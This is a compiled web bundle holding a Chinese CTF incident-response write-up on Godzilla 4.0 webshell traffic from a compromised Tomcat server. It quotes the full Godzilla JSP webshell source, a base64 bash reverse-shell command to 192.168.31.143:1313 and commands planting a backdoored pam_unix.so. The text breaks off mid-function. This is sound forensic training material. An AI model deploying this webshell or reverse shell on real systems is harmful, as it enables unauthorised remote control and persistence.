"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[3656],{64674:(n,e,a)=>{a.r(e),a.d(e,{assets:()=>l,contentTitle:()=>i,default:()=>p,frontMatter:()=>r,metadata:()=>c,toc:()=>o});var s=a(85893),t=a(11151);const r={},i="\u7b2c\u516d\u7ae0 \u54e5\u65af\u62c9 4.0 \u6d41\u91cf\u5206\u6790",c={id:"Xuanji/Unit-6/91",title:"\u7b2c\u516d\u7ae0 \u54e5\u65af\u62c9 4.0 \u6d41\u91cf\u5206\u6790",description:"1",source:"@site/docs/Xuanji/Unit-6/91.md",sourceDirName:"Xuanji/Unit-6",slug:"/Xuanji/Unit-6/91",permalink:"/Target-Machines-WriteUp/docs/Xuanji/Unit-6/91",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Xuanji/Unit-6/91.md",tags:[],version:"current",frontMatter:{},sidebar:"Xuanji_Sidebar",previous:{title:"\u7b2c\u516d\u7ae0 \u6d41\u91cf\u7279\u5f81\u5206\u6790 - \u5c0f\u738b\u516c\u53f8\u6536\u5230\u7684\u9493\u9c7c\u90ae\u4ef6",permalink:"/Target-Machines-WriteUp/docs/Xuanji/Unit-6/58"},next:{title:"\u7b2c\u4e03\u7ae0 \u5e38\u89c1\u653b\u51fb\u4e8b\u4ef6\u5206\u6790 - \u9493\u9c7c\u90ae\u4ef6",permalink:"/Target-Machines-WriteUp/docs/Xuanji/Unit-7/52"}},l={},o=[{value:"1",id:"1",level:2},{value:"2",id:"2",level:2},{value:"3",id:"3",level:2},{value:"4",id:"4",level:2},{value:"5",id:"5",level:2},{value:"6",id:"6",level:2},{value:"7",id:"7",level:2},{value:"8",id:"8",level:2},{value:"9",id:"9",level:2},{value:"10",id:"10",level:2},{value:"11",id:"11",level:2},{value:"12",id:"12",level:2},{value:"13",id:"13",level:2}];function d(n){const e={admonition:"admonition",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,t.a)(),...n.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(e.header,{children:(0,s.jsx)(e.h1,{id:"\u7b2c\u516d\u7ae0-\u54e5\u65af\u62c9-40-\u6d41\u91cf\u5206\u6790",children:"\u7b2c\u516d\u7ae0 \u54e5\u65af\u62c9 4.0 \u6d41\u91cf\u5206\u6790"})}),"\n",(0,s.jsx)(e.h2,{id:"1",children:"1"}),"\n",(0,s.jsxs)(e.blockquote,{children:["\n",(0,s.jsx)(e.p,{children:"\u9ed1\u5ba2\u7684 IP \u662f\u4ec0\u4e48\uff1f"}),"\n"]}),"\n",(0,s.jsx)(e.p,{children:"\u5728\u6570\u636e\u5305\u4e2d\u6ce8\u610f\u5230\u5927\u91cf\u7684\u76ee\u5f55\u626b\u63cf\u6d41\u91cf"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(38829).Z+"",width:"2560",height:"1540"})}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-flag",children:"flag{192.168.31.190}\n"})}),"\n",(0,s.jsx)(e.h2,{id:"2",children:"2"}),"\n",(0,s.jsxs)(e.blockquote,{children:["\n",(0,s.jsx)(e.p,{children:"\u9ed1\u5ba2\u662f\u901a\u8fc7\u4ec0\u4e48\u6f0f\u6d1e\u8fdb\u5165\u670d\u52a1\u5668\u7684\uff1f\uff08\u63d0\u4ea4 CVE \u7f16\u53f7\uff09"}),"\n"]}),"\n",(0,s.jsxs)(e.p,{children:["\u5bf9\u653b\u51fb\u8005\u7684\u6d41\u91cf\u8fdb\u884c\u5206\u6790\uff0c\u5728\u670d\u52a1\u7aef\u7684\u8fd4\u56de\u5305\u4e2d\u68c0\u6d4b\u5230 ",(0,s.jsx)(e.code,{children:"tomcat"})," \u5b57\u7b26\u4e32\u7684\u5b58\u5728\uff0c\u53ef\u4ee5\u5148\u786e\u5b9a\u670d\u52a1\u7aef\u4e2d\u95f4\u4ef6\u6709 ",(0,s.jsx)(e.code,{children:"tomcat"})]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(17189).Z+"",width:"2560",height:"1540"})}),"\n",(0,s.jsx)(e.p,{children:"\u7136\u540e\u8fdb\u4e00\u6b65\u8ddf\u8fdb\uff0c\u53d1\u73b0"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(55253).Z+"",width:"2560",height:"1540"})}),"\n",(0,s.jsxs)(e.p,{children:["\u4f7f\u7528 ",(0,s.jsx)(e.code,{children:"tomcat PUT file upload CVE"})," \u4f5c\u4e3a\u5173\u952e\u8bcd\u8fdb\u884c\u641c\u7d22\uff0c\u53ef\u4ee5\u5b9a\u4f4d\u5230\u4e24\u4e2a\u6f0f\u6d1e"]}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"CVE-2017-12615"}),"\n",(0,s.jsx)(e.li,{children:"CVE-2017-12617"}),"\n"]}),"\n",(0,s.jsx)(e.p,{children:"\u4e24\u4e2a\u7b54\u6848\u90fd\u8bd5\u7740\u63d0\u4ea4\u4e00\u4e0b\u5c31\u884c\u4e86"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-flag",children:"flag{CVE-2017-12615}\n"})}),"\n",(0,s.jsx)(e.h2,{id:"3",children:"3"}),"\n",(0,s.jsxs)(e.blockquote,{children:["\n",(0,s.jsx)(e.p,{children:"\u9ed1\u5ba2\u4e0a\u4f20\u7684\u6728\u9a6c\u6587\u4ef6\u540d\u662f\u4ec0\u4e48\uff1f(\u63d0\u4ea4\u6587\u4ef6\u540d)"}),"\n"]}),"\n",(0,s.jsx)(e.p,{children:"\u5728\u4e0a\u4e00\u9898\u7684\u8bf7\u6c42\u4e2d\u5c31\u6709"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-flag",children:"flag{hello.jsp}\n"})}),"\n",(0,s.jsx)(e.h2,{id:"4",children:"4"}),"\n",(0,s.jsxs)(e.blockquote,{children:["\n",(0,s.jsx)(e.p,{children:"\u9ed1\u5ba2\u4e0a\u4f20\u7684\u6728\u9a6c\u8fde\u63a5\u5bc6\u7801\u662f\u4ec0\u4e48\uff1f"}),"\n"]}),"\n",(0,s.jsx)(e.p,{children:"\u63d0\u53d6\u653b\u51fb\u8005\u4e0a\u4f20\u7684 jsp \u6587\u4ef6\u7684\u6e90\u7801"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-java",children:'<% !String xc = "1710acba6220f62b";\nString pass = "7f0e6f";\nString md5 = md5(pass + xc);\nclass X extends ClassLoader {\n    public X(ClassLoader z) {\n        super(z);\n    }\n    public Class Q(byte[] cb) {\n        return super.defineClass(cb, 0, cb.length);\n    }\n}\npublic byte[] x(byte[] s, boolean m) {\n    try {\n        javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");\n        c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));\n        return c.doFinal(s);\n    } catch (Exception e) {\n        return null;\n    }\n}\npublic static String md5(String s) {\n    String ret = null;\n    try {\n        java.security.MessageDigest m;\n        m = java.security.MessageDigest.getInstance("MD5");\n        m.update(s.getBytes(), 0, s.length());\n        ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();\n    } catch (Exception e) {}\n    return ret;\n}\npublic static String base64Encode(byte[] bs) throws Exception {\n    Class base64;\n    String value = null;\n    try {\n        base64 = Class.forName("java.util.Base64");\n        Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);\n        value = (String) Encoder.getClass().getMethod("encodeToString", new Class[] {\n            byte[].class\n        }).invoke(Encoder, new Object[] {\n            bs\n        });\n    } catch (Exception e) {\n        try {\n            base64 = Class.forName("sun.misc.BASE64Encoder");\n            Object Encoder = base64.newInstance();\n            value = (String) Encoder.getClass().getMethod("encode", new Class[] {\n                byte[].class\n            }).invoke(Encoder, new Object[] {\n                bs\n            });\n        } catch (Exception e2) {}\n    }\n    return value;\n}\npublic static byte[] base64Decode(String bs) throws Exception {\n        Class base64;\n        byte[] value = null;\n        try {\n            base64 = Class.forName("java.util.Base64");\n            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);\n            value = (byte[]) decoder.getClass().getMethod("decode", new Class[] {\n                String.class\n            }).invoke(decoder, new Object[] {\n                bs\n            });\n        } catch (Exception e) {\n            try {\n                base64 = Class.forName("sun.misc.BASE64Decoder");\n                Object decoder = base64.newInstance();\n                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[] {\n                    String.class\n                }).invoke(decoder, new Object[] {\n                    bs\n                });\n            } catch (Exception e2) {}\n        }\n        return value;\n    } %> <%\n    try {\n        byte[] data = base64Decode(request.getParameter(pass));\n        data = x(data, false);\n        if (session.getAttribute("payload") == null) {\n            session.setAttribute("payload", new X(this.getClass().getClassLoader()).Q(data));\n        } else {\n            request.setAttribute("parameters", data);\n            java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();\n            Object f = ((Class) session.getAttribute("payload")).newInstance();\n            f.equals(arrOut);\n            f.equals(pageContext);\n            response.getWriter().write(md5.substring(0, 16));\n            f.toString();\n            response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));\n            response.getWriter().write(md5.substring(16));\n        }\n    } catch (Exception e) {}\n%>\n'})}),"\n",(0,s.jsx)(e.p,{children:"\u5373\u53ef\u5728 Webshell \u7684\u5934\u90e8\u627e\u5230\u5bc6\u7801"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-flag",children:"flag{7f0e6f}\n"})}),"\n",(0,s.jsx)(e.h2,{id:"5",children:"5"}),"\n",(0,s.jsxs)(e.blockquote,{children:["\n",(0,s.jsx)(e.p,{children:"\u9ed1\u5ba2\u4e0a\u4f20\u7684\u6728\u9a6c\u89e3\u5bc6\u5bc6\u94a5\u662f\u4ec0\u4e48\uff1f"}),"\n"]}),"\n",(0,s.jsx)(e.p,{children:"\u4e5f\u662f\u5728 Webshell \u6587\u4ef6\u7684\u5934\u90e8"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-flag",children:"flag{1710acba6220f62b}\n"})}),"\n",(0,s.jsx)(e.h2,{id:"6",children:"6"}),"\n",(0,s.jsxs)(e.blockquote,{children:["\n",(0,s.jsx)(e.p,{children:"\u9ed1\u5ba2\u8fde\u63a5 webshell \u540e\u6267\u884c\u7684\u7b2c\u4e00\u6761\u547d\u4ee4\u662f\u4ec0\u4e48\uff1f"}),"\n"]}),"\n",(0,s.jsx)(e.p,{children:"\u5b9a\u4f4d\u5230\u653b\u51fb\u8005\u4e0e Webshell \u4ea4\u4e92\u7684\u7b2c\u4e00\u6761\u6d41\u91cf"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(20621).Z+"",width:"2560",height:"1540"})}),"\n",(0,s.jsx)(e.p,{children:"\u4f7f\u7528\u652f\u6301\u54e5\u65af\u62c9\u6d41\u91cf\u89e3\u5bc6\u7684\u5de5\u5177\u6216\u8005\u811a\u672c\uff0c\u5bf9\u653b\u51fb\u8005\u4f20\u8f93\u7684 payload \u8fdb\u884c\u89e3\u5bc6"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(533).Z+"",width:"2560",height:"1540"})}),"\n",(0,s.jsx)(e.p,{children:"\u53ef\u4ee5\u786e\u5b9a\u4e3a\u54e5\u65af\u62c9\u7684\u73af\u5883\u521d\u59cb\u5316\u63a2\u6d4b\u7684\u90e8\u5206\uff0c\u7ee7\u7eed\u5f80\u4e0b\u5206\u6790"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(14093).Z+"",width:"2560",height:"1540"})}),"\n",(0,s.jsx)(e.p,{children:"\u8fd9\u91cc\u5c31\u662f\u653b\u51fb\u8005\u624b\u52a8\u6267\u884c\u7684\u7b2c\u4e00\u6761\u547d\u4ee4"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-flag",children:"flag{uname -r}\n"})}),"\n",(0,s.jsx)(e.h2,{id:"7",children:"7"}),"\n",(0,s.jsxs)(e.blockquote,{children:["\n",(0,s.jsx)(e.p,{children:"\u9ed1\u5ba2\u8fde\u63a5 webshell \u65f6\u67e5\u8be2\u5f53\u524d shell \u7684\u6743\u9650\u662f\u4ec0\u4e48\uff1f"}),"\n"]}),"\n",(0,s.jsxs)(e.p,{children:["\u5728\u54e5\u65af\u62c9\u524d\u9762\u51e0\u6761\u8fde\u63a5\u6d41\u91cf\u4e2d\u4e2d\uff0c\u6267\u884c\u4e86 ",(0,s.jsx)(e.code,{children:"getBasicsInfo"})," \u6a21\u5757"]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(51649).Z+"",width:"2560",height:"1540"})}),"\n",(0,s.jsx)(e.p,{children:"\u89e3\u5bc6\u8fd4\u56de\u5305"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(14146).Z+"",width:"1285",height:"945"})}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-plaintext",children:'FileRoot : /;\nCurrentDir : //\nCurrentUser : root\nProcessArch : 64\nTempDirectory : /opt/apache-tomcat-8.5.19/temp/\nDocBase : /opt/apache-tomcat-8.5.19/webapps/ROOT/\nRealFile : /opt/apache-tomcat-8.5.19/webapps/ROOT/\nservletRequest : 1763462523\nservletContext : 1993764884\nhttpSession : 1001775710\nOsInfo : os.name: Linux os.version: 4.19.0-25-amd64 os.arch: amd64\nIPList : [fe80:0:0:0:20c:29ff:fedb:ea16%ens33, 192.168.31.168, 0:0:0:0:0:0:0:1%lo, 127.0.0.1]\njava.runtime.name : Java(TM) SE Runtime Environment\njava.protocol.handler.pkgs : org.apache.catalina.webresources\nsun.boot.library.path : /opt/jdk1.8.0_411/jre/lib/amd64\njava.vm.version : 25.411-b09\nshared.loader :\njava.vm.vendor : Oracle Corporation\njava.vendor.url : http://java.oracle.com/\npath.separator : :\ntomcat.util.buf.StringCache.byte.enabled : true\njava.util.logging.config.file : /opt/apache-tomcat-8.5.19/conf/logging.properties\njava.vm.name : Java HotSpot(TM) 64-Bit Server VM\nfile.encoding.pkg : sun.io\nuser.country : US\nsun.java.launcher : SUN_STANDARD\nsun.os.patch.level : unknown\ntomcat.util.scan.StandardJarScanFilter.jarsToScan : log4j-web*.jar,log4j-taglib*.jar,log4javascript*.jar,slf4j-taglib*.jar\njava.vm.specification.name : Java Virtual Machine Specification\nuser.dir : /\njava.runtime.version : 1.8.0_411-b09\njava.awt.graphicsenv : sun.awt.X11GraphicsEnvironment\njava.endorsed.dirs : /opt/jdk1.8.0_411/jre/lib/endorsed\nos.arch : amd64\njava.io.tmpdir : /opt/apache-tomcat-8.5.19/temp\nline.separator :\n\njava.vm.specification.vendor : Oracle Corporation\njava.naming.factory.url.pkgs : org.apache.naming\njava.util.logging.manager : org.apache.juli.ClassLoaderLogManager\nos.name : Linux\nsun.jnu.encoding : UTF-8\njava.library.path : /usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib\njava.specification.name : Java Platform API Specification\njava.class.version : 52.0\nsun.management.compiler : HotSpot 64-Bit Tiered Compilers\nos.version : 4.19.0-25-amd64\njava.util.concurrent.ForkJoinPool.common.threadFactory : org.apache.catalina.startup.SafeForkJoinWorkerThreadFactory\nuser.home : /root\ncatalina.useNaming : true\nuser.timezone : America/New_York\njava.awt.printerjob : sun.print.PSPrinterJob\nfile.encoding : UTF-8\njava.specification.version : 1.8\ntomcat.util.scan.StandardJarScanFilter.jarsToSkip : bootstrap.jar,commons-daemon.jar,tomcat-juli.jar,annotations-api.jar,el-api.jar,jsp-api.jar,servlet-api.jar,websocket-api.jar,jaspic-api.jar,catalina.jar,catalina-ant.jar,catalina-ha.jar,catalina-storeconfig.jar,catalina-tribes.jar,jasper.jar,jasper-el.jar,ecj-*.jar,tomcat-api.jar,tomcat-util.jar,tomcat-util-scan.jar,tomcat-coyote.jar,tomcat-dbcp.jar,tomcat-jni.jar,tomcat-websocket.jar,tomcat-i18n-en.jar,tomcat-i18n-es.jar,tomcat-i18n-fr.jar,tomcat-i18n-ja.jar,tomcat-juli-adapters.jar,catalina-jmx-remote.jar,catalina-ws.jar,tomcat-jdbc.jar,tools.jar,commons-beanutils*.jar,commons-codec*.jar,commons-collections*.jar,commons-dbcp*.jar,commons-digester*.jar,commons-fileupload*.jar,commons-httpclient*.jar,commons-io*.jar,commons-lang*.jar,commons-logging*.jar,commons-math*.jar,commons-pool*.jar,jstl.jar,taglibs-standard-spec-*.jar,geronimo-spec-jaxrpc*.jar,wsdl4j*.jar,ant.jar,ant-junit*.jar,aspectj*.jar,jmx.jar,h2*.jar,hibernate*.jar,httpclient*.jar,jmx-tools.jar,jta*.jar,log4j*.jar,mail*.jar,slf4j*.jar,xercesImpl.jar,xmlParserAPIs.jar,xml-apis.jar,junit.jar,junit-*.jar,hamcrest-*.jar,easymock-*.jar,cglib-*.jar,objenesis-*.jar,ant-launcher.jar,cobertura-*.jar,asm-*.jar,dom4j-*.jar,icu4j-*.jar,jaxen-*.jar,jdom-*.jar,jetty-*.jar,oro-*.jar,servlet-api-*.jar,tagsoup-*.jar,xmlParserAPIs-*.jar,xom-*.jar\ncatalina.home : /opt/apache-tomcat-8.5.19\njava.class.path : /opt/apache-tomcat-8.5.19/bin/bootstrap.jar:/opt/apache-tomcat-8.5.19/bin/tomcat-juli.jar\nuser.name : root\njava.naming.factory.initial : org.apache.naming.java.javaURLContextFactory\npackage.definition : sun.,java.,org.apache.catalina.,org.apache.coyote.,org.apache.jasper.,org.apache.naming.,org.apache.tomcat.\njava.vm.specification.version : 1.8\nsun.java.command : org.apache.catalina.startup.Bootstrap start\njava.home : /opt/jdk1.8.0_411/jre\nsun.arch.data.model : 64\nuser.language : en\njava.specification.vendor : Oracle Corporation\nawt.toolkit : sun.awt.X11.XToolkit\njava.vm.info : mixed mode\njava.version : 1.8.0_411\njava.ext.dirs : /opt/jdk1.8.0_411/jre/lib/ext:/usr/java/packages/lib/ext\nsun.boot.class.path : /opt/jdk1.8.0_411/jre/lib/resources.jar:/opt/jdk1.8.0_411/jre/lib/rt.jar:/opt/jdk1.8.0_411/jre/lib/jsse.jar:/opt/jdk1.8.0_411/jre/lib/jce.jar:/opt/jdk1.8.0_411/jre/lib/charsets.jar:/opt/jdk1.8.0_411/jre/lib/jfr.jar:/opt/jdk1.8.0_411/jre/classes\nserver.loader :\njava.vendor : Oracle Corporation\ncatalina.base : /opt/apache-tomcat-8.5.19\njava.specification.maintenance.version : 5\njdk.tls.ephemeralDHKeySize : 2048\nfile.separator : /\njava.vendor.url.bug : http://bugreport.sun.com/bugreport/\ncommon.loader : "${catalina.base}/lib","${catalina.base}/lib/*.jar","${catalina.home}/lib","${catalina.home}/lib/*.jar"\nsun.io.unicode.encoding : UnicodeLittle\nsun.cpu.endian : little\npackage.access : sun.,org.apache.catalina.,org.apache.coyote.,org.apache.jasper.,org.apache.tomcat.\nsun.cpu.isalist :\nPATH : /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/jdk1.8.0_411/bin\nINVOCATION_ID : c4a04d68ba5a492d99d48d5762efb5a7\nJRE_HOME : /opt/jdk1.8.0_411/jre\nCATALINA_BASE : /opt/apache-tomcat-8.5.19\nJOURNAL_STREAM : 9:16138\nCATALINA_PID : /opt/apache-tomcat-8.5.19/tomcat.pid\nJAVA_HOME : /opt/jdk1.8.0_411\nPWD : /\nCLASSPATH : /opt/apache-tomcat-8.5.19/bin/bootstrap.jar:/opt/apache-tomcat-8.5.19/bin/tomcat-juli.jar\nLANG : en_US.UTF-8\n'})}),"\n",(0,s.jsx)(e.p,{children:"\u5373\u53ef\u5f97\u77e5\u5f53\u524d\u7528\u6237"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-flag",children:"flag{root}\n"})}),"\n",(0,s.jsx)(e.h2,{id:"8",children:"8"}),"\n",(0,s.jsxs)(e.blockquote,{children:["\n",(0,s.jsx)(e.p,{children:"\u9ed1\u5ba2\u5229\u7528 webshell \u6267\u884c\u547d\u4ee4\u67e5\u8be2\u670d\u52a1\u5668 Linux \u7cfb\u7edf\u53d1\u884c\u7248\u672c\u662f\u4ec0\u4e48\uff1f"}),"\n"]}),"\n",(0,s.jsxs)(e.p,{children:["\u5c06\u653b\u51fb\u8005\u6267\u884c ",(0,s.jsx)(e.code,{children:"uname -r"})," \u7684\u8fd4\u56de\u5305\u8fdb\u884c\u89e3\u5bc6"]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(18543).Z+"",width:"2560",height:"1540"})}),"\n",(0,s.jsx)(e.p,{children:"\u4f46\u662f\u9898\u76ee\u95ee\u7684\u662f Linux \u7248\u672c\uff0c\u4e8e\u662f\u7ee7\u7eed\u5f80\u4e0b\u8ddf\u8fdb"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(5380).Z+"",width:"2560",height:"1540"})}),"\n",(0,s.jsx)(e.p,{children:"\u8fd9\u91cc\u5f97\u5230\u7684\u5c31\u662f Linux \u7248\u672c"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-flag",children:"flag{Debian GNU/Linux 10 (buster)}\n"})}),"\n",(0,s.jsx)(e.h2,{id:"9",children:"9"}),"\n",(0,s.jsxs)(e.blockquote,{children:["\n",(0,s.jsx)(e.p,{children:"\u9ed1\u5ba2\u5229\u7528 webshell \u6267\u884c\u547d\u4ee4\u8fd8\u67e5\u8be2\u5e76\u8fc7\u6ee4\u4e86\u4ec0\u4e48\uff1f\uff08\u63d0\u4ea4\u6574\u6761\u6267\u884c\u6210\u529f\u7684\u547d\u4ee4\uff09"}),"\n"]}),"\n",(0,s.jsx)(e.p,{children:"\u7ee7\u7eed\u5f80\u4e0b\u8ddf\u8e2a"}),"\n",(0,s.jsx)(e.p,{children:"\u7531\u4e8e\u9898\u76ee\u9650\u5236\u8303\u56f4\u4e3a\u6267\u884c\u6210\u529f\u7684\u6307\u4ee4\uff0c\u6240\u4ee5\u53ef\u4ee5\u5ffd\u7565\u524d\u9762\u90e8\u5206\u6267\u884c\u6267\u884c\u5931\u8d25\u7684\u6307\u4ee4\uff08\u5305\u62ec\u6307\u4ee4\u8f93\u5165\u9519\u8bef\uff0c\u4ee5\u53ca\u672a\u627e\u5230\u6587\u4ef6\u7684\u60c5\u5f62\uff09"}),"\n",(0,s.jsx)(e.p,{children:"\u5b9a\u4f4d\u5230\u8fd9\u6761\u4ea4\u4e92"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(15941).Z+"",width:"2560",height:"1540"})}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-flag",children:"flag{dpkg -l libpam-modules:amd64}\n"})}),"\n",(0,s.jsx)(e.h2,{id:"10",children:"10"}),"\n",(0,s.jsxs)(e.blockquote,{children:["\n",(0,s.jsxs)(e.p,{children:["\u9ed1\u5ba2\u7559\u4e0b\u540e\u95e8\u7684\u53cd\u8fde\u7684 IP \u548c PORT \u662f\u4ec0\u4e48\uff1f\uff08IP",":PORT",")"]}),"\n"]}),"\n",(0,s.jsx)(e.p,{children:"\u8fdb\u4e00\u6b65\u8ddf\u8e2a\u6d41\u91cf"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(84237).Z+"",width:"2560",height:"1540"})}),"\n",(0,s.jsx)(e.p,{children:"\u5bf9\u5176\u4e2d Base64 \u7f16\u7801\u90e8\u5206\u8fdb\u884c\u89e3\u7801"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-plaintest",children:"L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMTQzLzEzMTMgMD4mMQ==\n/bin/bash -i >& /dev/tcp/192.168.31.143/1313 0>&1\n"})}),"\n",(0,s.jsx)(e.p,{children:"\u5178\u578b\u7684 Bash \u53cd\u5f39 shell \u7684\u6307\u4ee4"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-flag",children:"flag{192.168.31.143:1313}\n"})}),"\n",(0,s.jsx)(e.h2,{id:"11",children:"11"}),"\n",(0,s.jsxs)(e.blockquote,{children:["\n",(0,s.jsx)(e.p,{children:"\u9ed1\u5ba2\u901a\u8fc7\u4ec0\u4e48\u6587\u4ef6\u7559\u4e0b\u4e86\u540e\u95e8\uff1f"}),"\n"]}),"\n",(0,s.jsx)(e.p,{children:"\u7ee7\u7eed\u8ddf\u8fdb\uff0c\u53ef\u4ee5\u627e\u5230\u670d\u52a1\u7aef\u53cd\u8fde\u653b\u51fb\u8005\u76d1\u542c\u5668\u7684\u6d41\u91cf"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(52220).Z+"",width:"1711",height:"1436"})}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-plaintext",children:"bash: cannot set terminal process group (403): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@debian:/#\ncp /lib/x86_64-linux-gnu/security/pam_unix.so /opt/.pam_unix.so.bak\n\n\n<inux-gnu/security/pam_unix.so /opt/.pam_unix.so.bak\nroot@debian:/#\ncp /tmp/pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so\n\ncp /tmp/pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so\nroot@debian:/#\nexit\n\nexit\nexit\n"})}),"\n",(0,s.jsxs)(e.p,{children:["\u7ed3\u5408\u4e0a\u51e0\u6761\u6d41\u91cf\u4e2d\uff0c\u653b\u51fb\u8005\u66fe\u5217\u51fa ",(0,s.jsx)(e.code,{children:"/tmp"})," \u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\uff0c\u4ee5\u53ca\u8fdb\u884c\u4e86\u4e00\u6b65\u5927\u6570\u636e Webshell \u4ea4\u4e92\u6d41\u91cf\uff0c\u53ef\u4ee5\u65ad\u5b9a ",(0,s.jsx)(e.code,{children:"/tmp/pam_unix.so"})," \u4e3a\u653b\u51fb\u8005\u4e0a\u4f20\u7684\u6076\u610f\u6587\u4ef6"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-flag",children:"flag{pam_unix.so}\n"})}),"\n",(0,s.jsx)(e.h2,{id:"12",children:"12"}),"\n",(0,s.jsxs)(e.blockquote,{children:["\n",(0,s.jsx)(e.p,{children:"\u9ed1\u5ba2\u8bbe\u7f6e\u7684\u540e\u95e8\u5bc6\u7801\u662f\u4ec0\u4e48\uff1f"}),"\n"]}),"\n",(0,s.jsx)(e.p,{children:"\u5bf9\u653b\u51fb\u8005\u4e0a\u4f20\u64cd\u4f5c\u7684\u6d41\u91cf\u8fdb\u884c\u89e3\u5bc6"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(64402).Z+"",width:"2560",height:"1540"})}),"\n",(0,s.jsxs)(e.p,{children:["\u5728\u5176\u4e2d\u5b58\u5728\u6709",(0,s.jsx)(e.code,{children:"elf"}),"\u6587\u4ef6\uff0c\u5c06\u5176\u5341\u516d\u8fdb\u5236\u6570\u636e\u8fdb\u884c\u5206\u5272\uff0c\u63d0\u53d6\u51fa",(0,s.jsx)(e.code,{children:"elf"}),"\u90e8\u5206"]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(62880).Z+"",width:"2559",height:"1371"})}),"\n",(0,s.jsxs)(e.p,{children:["\u4f46\u662f\u4f7f\u7528\u63d0\u53d6\u51fa\u6765\u7684",(0,s.jsx)(e.code,{children:"elf"}),"\u6587\u4ef6\u65a4\u897f\u74dc\u5206\u6790\u5931\u8d25\u4e86\uff0c\u731c\u6d4b\u53ef\u80fd\u54e5\u65af\u62c9\u8fdb\u884c\u4e86\u5904\u7406"]}),"\n",(0,s.jsx)(e.p,{children:"\u7ed3\u5408\u5b58\u5728\u6709\u8fdc\u7a0b\u9776\u673a\uff0c\u5c06\u9776\u673a\u4e0a\u7684\u6587\u4ef6\u63d0\u53d6\u4e0b\u6765\u8fdb\u884c\u5206\u6790"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(22391).Z+"",width:"2560",height:"1540"})}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-c",children:'int __fastcall main(int argc, const char **argv, const char **envp)\n{\n    unsigned __int8 hostname[100]; // [rsp+0h] [rbp-78h] BYREF\n\n    get_dns_servers();\n    printf("Enter Hostname to Lookup : ");\n    __isoc99_scanf("%s", hostname);\n    ngethostbyname(hostname, 1);\n    return 